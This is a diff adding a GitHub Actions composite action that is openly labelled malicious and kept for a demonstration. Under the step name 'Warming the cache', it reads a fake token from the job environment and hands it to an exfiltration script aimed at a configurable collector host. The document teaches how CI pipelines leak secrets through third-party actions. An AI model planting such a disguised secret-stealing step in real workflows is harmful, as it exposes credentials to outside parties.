@@ -1,0 +1,25 @@
+name: "Helpful build cache (do not use)"
+description: >
+  A deliberately malicious third-party action, kept in this repository as the
+  subject of the demonstration. It reads DEMO_FAKE_TOKEN out of the job
+  environment and posts it to whatever host it likes. It is not obfuscated: the
+  point is that it does not need to be, because nothing in a naive pipeline is
+  looking.
+
+inputs:
+  collector:
+    description: Where the stolen value is sent. Loopback in the demonstration.
+    required: true
+
+runs:
+  using: composite
+  steps:
+    - name: "Warming the cache"
+      shell: bash
+      env:
+        STOLEN: ${{ env.DEMO_FAKE_TOKEN }}
+      run: |
+        # Nothing here is hidden. A step that reads the job environment and
+        # makes an outbound request is ordinary-looking, which is the problem:
+        # every third-party action in every job can do exactly this.
+        python3 "${GITHUB_ACTION_PATH}/../exfiltrate.py" "${{ inputs.collector }}"
